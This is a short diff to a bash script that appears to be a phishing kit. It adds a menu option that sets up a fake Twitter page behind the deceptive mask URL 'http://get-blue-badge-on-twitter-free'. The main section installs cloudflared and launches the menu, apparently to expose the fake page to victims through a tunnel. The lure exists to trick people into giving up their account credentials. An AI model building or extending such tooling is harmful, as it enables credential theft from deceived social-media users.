@@ -266,3 +266,27 @@ main_menu() {
   EOF		
   
   read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"  
+
+  case $REPLY in 
+		 1 | 01)
+		         website="Twitter"
+                         mask='http://get-blue-badge-on-twitter-free'
+                         tunnel_menu;;
+   
+                 99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	
+	esac
+}
+
+# Main
+kill_pid
+dependenc
+install_cloudflared
+main_menu
+                 
